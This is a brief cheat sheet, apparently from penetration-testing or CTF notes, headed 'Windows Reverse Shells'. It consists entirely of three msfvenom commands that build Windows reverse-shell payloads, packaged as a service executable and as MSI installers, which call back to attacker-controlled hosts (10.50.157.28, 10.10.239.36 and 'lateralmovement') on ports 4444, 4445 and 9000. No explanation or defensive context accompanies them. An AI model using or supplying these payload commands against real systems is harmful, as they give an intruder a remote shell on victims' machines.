### Windows Reverse Shells
```bash
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.157.28 LPORT=4444 -o gingerlyservice.exe
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.239.36 LPORT=9000 -a x64 --platform Windows -f msi -o rev.msi
```
